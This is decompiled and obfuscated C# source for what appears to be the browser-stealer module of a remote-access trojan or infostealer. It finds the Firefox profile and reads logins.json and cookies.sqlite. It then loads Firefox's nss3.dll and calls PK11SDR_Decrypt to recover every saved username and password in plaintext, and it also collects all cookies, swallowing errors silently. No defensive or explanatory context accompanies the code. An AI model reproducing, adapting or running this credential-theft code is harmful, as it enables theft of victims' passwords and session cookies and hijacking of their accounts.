using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.Win32;

public static class GClass14
{
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate long Delegate3(string configdir);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate int Delegate4(ref Struct8 data, ref Struct8 result, int cx);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate long Delegate5();

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate long Delegate6(long slot, bool loadCerts, long wincx);

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	private delegate int Delegate7(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

	private struct Struct8
	{
		public int int_0;

		public int int_1;

		public int int_2;
	}

	public class GClass15
	{
		[CompilerGenerated]
		private int int_0;

		[CompilerGenerated]
		private string string_0;

		[CompilerGenerated]
		private object object_0;

		[CompilerGenerated]
		private string string_1;

		[CompilerGenerated]
		private string string_2;

		[CompilerGenerated]
		private string string_3;

		[CompilerGenerated]
		private string string_4;

		[CompilerGenerated]
		private string string_5;

		[CompilerGenerated]
		private string string_6;

		[CompilerGenerated]
		private int int_1;

		[CompilerGenerated]
		private long long_0;

		[CompilerGenerated]
		private long long_1;

		[CompilerGenerated]
		private long long_2;

		[CompilerGenerated]
		private int int_2;

		public int id
		{
			[CompilerGenerated]
			get
			{
				return int_0;
			}
			[CompilerGenerated]
			set
			{
				int_0 = value;
			}
		}

		public string hostname
		{
			[CompilerGenerated]
			get
			{
				return string_0;
			}
			[CompilerGenerated]
			set
			{
				string_0 = value;
			}
		}

		public object httpRealm
		{
			[CompilerGenerated]
			get
			{
				return object_0;
			}
			[CompilerGenerated]
			set
			{
				object_0 = value;
			}
		}

		public string formSubmitURL
		{
			[CompilerGenerated]
			get
			{
				return string_1;
			}
			[CompilerGenerated]
			set
			{
				string_1 = value;
			}
		}

		public string usernameField
		{
			[CompilerGenerated]
			get
			{
				return string_2;
			}
			[CompilerGenerated]
			set
			{
				string_2 = value;
			}
		}

		public string passwordField
		{
			[CompilerGenerated]
			get
			{
				return string_3;
			}
			[CompilerGenerated]
			set
			{
				string_3 = value;
			}
		}

		public string encryptedUsername
		{
			[CompilerGenerated]
			get
			{
				return string_4;
			}
			[CompilerGenerated]
			set
			{
				string_4 = value;
			}
		}

		public string encryptedPassword
		{
			[CompilerGenerated]
			get
			{
				return string_5;
			}
			[CompilerGenerated]
			set
			{
				string_5 = value;
			}
		}

		public string guid
		{
			[CompilerGenerated]
			get
			{
				return string_6;
			}
			[CompilerGenerated]
			set
			{
				string_6 = value;
			}
		}

		public int encType
		{
			[CompilerGenerated]
			get
			{
				return int_1;
			}
			[CompilerGenerated]
			set
			{
				int_1 = value;
			}
		}

		public long timeCreated
		{
			[CompilerGenerated]
			get
			{
				return long_0;
			}
			[CompilerGenerated]
			set
			{
				long_0 = value;
			}
		}

		public long timeLastUsed
		{
			[CompilerGenerated]
			get
			{
				return long_1;
			}
			[CompilerGenerated]
			set
			{
				long_1 = value;
			}
		}

		public long timePasswordChanged
		{
			[CompilerGenerated]
			get
			{
				return long_2;
			}
			[CompilerGenerated]
			set
			{
				long_2 = value;
			}
		}

		public int timesUsed
		{
			[CompilerGenerated]
			get
			{
				return int_2;
			}
			[CompilerGenerated]
			set
			{
				int_2 = value;
			}
		}
	}

	public class GClass16
	{
		[CompilerGenerated]
		private int int_0;

		[CompilerGenerated]
		private List<GClass15> list_0;

		[CompilerGenerated]
		private List<object> list_1;

		[CompilerGenerated]
		private int int_1;

		public int nextId
		{
			[CompilerGenerated]
			get
			{
				return int_0;
			}
			[CompilerGenerated]
			set
			{
				int_0 = value;
			}
		}

		public List<GClass15> logins
		{
			[CompilerGenerated]
			get
			{
				return list_0;
			}
			[CompilerGenerated]
			set
			{
				list_0 = value;
			}
		}

		public List<object> disabledHosts
		{
			[CompilerGenerated]
			get
			{
				return list_1;
			}
			[CompilerGenerated]
			set
			{
				list_1 = value;
			}
		}

		public int version
		{
			[CompilerGenerated]
			get
			{
				return int_1;
			}
			[CompilerGenerated]
			set
			{
				int_1 = value;
			}
		}
	}

	private static IntPtr intptr_0;

	private static DirectoryInfo directoryInfo_0;

	private static DirectoryInfo directoryInfo_1;

	private static FileInfo fileInfo_0;

	private static FileInfo fileInfo_1;

	static GClass14()
	{
		try
		{
			directoryInfo_0 = smethod_7();
			if (directoryInfo_0 == null)
			{
				throw new NullReferenceException("Firefox is not installed, or the install path could not be located");
			}
			directoryInfo_1 = smethod_5();
			if (directoryInfo_1 == null)
			{
				throw new NullReferenceException("Firefox does not have any profiles, has it ever been launched?");
			}
			fileInfo_0 = smethod_6(directoryInfo_1, "logins.json");
			if (fileInfo_0 == null)
			{
				throw new NullReferenceException("Firefox does not have any logins.json file");
			}
			fileInfo_1 = smethod_6(directoryInfo_1, "cookies.sqlite");
			if (fileInfo_1 == null)
			{
				throw new NullReferenceException("Firefox does not have any cookie file");
			}
		}
		catch (Exception)
		{
		}
	}

	public static List<GClass56> smethod_0()
	{
		List<GClass56> list = new List<GClass56>();
		try
		{
			smethod_2(directoryInfo_1, directoryInfo_0);
			GClass16 gClass = new GClass16();
			using (StreamReader streamReader = new StreamReader(fileInfo_0.FullName))
			{
				gClass = GClass11.smethod_1<GClass16>(streamReader.ReadToEnd());
			}
			foreach (GClass15 login in gClass.logins)
			{
				string username = smethod_13(login.encryptedUsername);
				string password = smethod_13(login.encryptedPassword);
				Uri uri = new Uri(login.formSubmitURL);
				list.Add(new GClass56
				{
					URL = uri.AbsoluteUri,
					Username = username,
					Password = password,
					Application = "Firefox"
				});
			}
			return list;
		}
		catch (Exception)
		{
			return list;
		}
	}

	public static List<GClass18> smethod_1()
	{
		List<GClass18> list = new List<GClass18>();
		GClass12 gClass = new GClass12(fileInfo_1.FullName);
		if (!gClass.method_9("moz_cookies"))
		{
			throw new Exception("Could not read cookie table");
		}
		int num = gClass.method_2();
		for (int i = 0; i < num; i++)
		{
			try
			{
				string host = gClass.method_5(i, "host");
				string name = gClass.method_5(i, "name");
				string value = gClass.method_5(i, "value");
				string path = gClass.method_5(i, "path");
				bool secure = ((!(gClass.method_5(i, "isSecure") == "0")) ? true : false);
				bool httpOnly = ((!(gClass.method_5(i, "isSecure") == "0")) ? true : false);
				long num2 = long.Parse(gClass.method_5(i, "expiry"));
				long num3 = smethod_4(DateTime.Now);
				DateTime expiresUTC = smethod_3(num2);
				bool expired = num3 > num2;
				list.Add(new GClass18
				{
					Host = host,
					ExpiresUTC = expiresUTC,
					Expired = expired,
					Name = name,
					Value = value,
					Path = path,
					Secure = secure,
					HttpOnly = httpOnly
				});
			}
			catch (Exception)
			{
				return list;
			}
		}
		return list;
	}

	private static void smethod_2(DirectoryInfo firefoxProfilePath, DirectoryInfo firefoxPath)
	{
		if (new Version(FileVersionInfo.GetVersionInfo(firefoxPath.FullName + "\\firefox.exe").FileVersion).Major >= new Version("35.0.0").Major)
		{
			GClass8.LoadLibrary(firefoxPath.FullName + "\\msvcr100.dll");
			GClass8.LoadLibrary(firefoxPath.FullName + "\\msvcp100.dll");
			GClass8.LoadLibrary(firefoxPath.FullName + "\\msvcr120.dll");
			GClass8.LoadLibrary(firefoxPath.FullName + "\\msvcp120.dll");
			GClass8.LoadLibrary(firefoxPath.FullName + "\\mozglue.dll");
			intptr_0 = GClass8.LoadLibrary(firefoxPath.FullName + "\\nss3.dll");
			((Delegate3)Marshal.GetDelegateForFunctionPointer(GClass8.GetProcAddress(intptr_0, "NSS_Init"), typeof(Delegate3)))(firefoxProfilePath.FullName);
			smethod_10(smethod_9(), loadCerts: true, 0L);
		}
	}

	private static DateTime smethod_3(long unixTime)
	{
		return new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddSeconds(unixTime);
	}

	private static long smethod_4(DateTime value)
	{
		return (long)(value - new DateTime(1970, 1, 1, 0, 0, 0, 0).ToLocalTime()).TotalSeconds;
	}

	private static DirectoryInfo smethod_5()
	{
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox\\Profiles";
		if (!Directory.Exists(path))
		{
			throw new Exception("Firefox Application Data folder does not exist!");
		}
		DirectoryInfo[] directories = new DirectoryInfo(path).GetDirectories();
		if (directories.Length == 0)
		{
			throw new IndexOutOfRangeException("No Firefox profiles could be found");
		}
		return directories[0];
	}

	private static FileInfo smethod_6(DirectoryInfo profilePath, string searchTerm)
	{
		FileInfo[] files = profilePath.GetFiles(searchTerm);
		int num = 0;
		if (0 >= files.Length)
		{
			throw new Exception("No Firefox logins.json was found");
		}
		return files[num];
	}

	private static DirectoryInfo smethod_7()
	{
		using (RegistryKey registryKey = (GClass46.Is64Bit ? GClass47.smethod_1(RegistryHive.LocalMachine, "SOFTWARE\\Wow6432Node\\Mozilla\\Mozilla Firefox") : GClass47.smethod_1(RegistryHive.LocalMachine, "SOFTWARE\\Mozilla\\Mozilla Firefox")))
		{
			if (registryKey == null)
			{
				return null;
			}
			string[] subKeyNames = registryKey.GetSubKeyNames();
			if (subKeyNames.Length == 0)
			{
				throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");
			}
			using RegistryKey key = registryKey.OpenSubKey(subKeyNames[0]);
			string valueSafe = key.OpenReadonlySubKeySafe("Main").GetValueSafe("Install Directory");
			if (string.IsNullOrEmpty(valueSafe))
			{
				throw new NullReferenceException("Install string was null or empty");
			}
			directoryInfo_0 = new DirectoryInfo(valueSafe);
		}
		return directoryInfo_0;
	}

	private static IntPtr smethod_8(string libPath)
	{
		if (string.IsNullOrEmpty(libPath))
		{
			throw new ArgumentNullException("libPath");
		}
		IntPtr intPtr = GClass8.LoadLibrary(libPath);
		if (intPtr == IntPtr.Zero)
		{
			int lastWin32Error = Marshal.GetLastWin32Error();
			throw new Exception(innerException: new Win32Exception(lastWin32Error)
			{
				Data = { 
				{
					(object)"LastWin32Error",
					(object?)lastWin32Error
				} }
			}, message: "can't load DLL " + libPath);
		}
		return intPtr;
	}

	private static long smethod_9()
	{
		return ((Delegate5)Marshal.GetDelegateForFunctionPointer(GClass8.GetProcAddress(intptr_0, "PK11_GetInternalKeySlot"), typeof(Delegate5)))();
	}

	private static long smethod_10(long slot, bool loadCerts, long wincx)
	{
		return ((Delegate6)Marshal.GetDelegateForFunctionPointer(GClass8.GetProcAddress(intptr_0, "PK11_Authenticate"), typeof(Delegate6)))(slot, loadCerts, wincx);
	}

	private static int smethod_11(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
	{
		return ((Delegate7)Marshal.GetDelegateForFunctionPointer(GClass8.GetProcAddress(intptr_0, "NSSBase64_DecodeBuffer"), typeof(Delegate7)))(arenaOpt, outItemOpt, inStr, inLen);
	}

	private static int smethod_12(ref Struct8 data, ref Struct8 result, int cx)
	{
		return ((Delegate4)Marshal.GetDelegateForFunctionPointer(GClass8.GetProcAddress(intptr_0, "PK11SDR_Decrypt"), typeof(Delegate4)))(ref data, ref result, cx);
	}

	private static string smethod_13(string cypherText)
	{
		StringBuilder stringBuilder = new StringBuilder(cypherText);
		int value = smethod_11(IntPtr.Zero, IntPtr.Zero, stringBuilder, stringBuilder.Length);
		Struct8 result = default(Struct8);
		Struct8 data = (Struct8)Marshal.PtrToStructure(new IntPtr(value), typeof(Struct8));
		if (smethod_12(ref data, ref result, 0) == 0 && result.int_2 != 0)
		{
			byte[] array = new byte[result.int_2];
			Marshal.Copy(new IntPtr(result.int_1), array, 0, result.int_2);
			return Encoding.UTF8.GetString(array);
		}
		return null;
	}
}
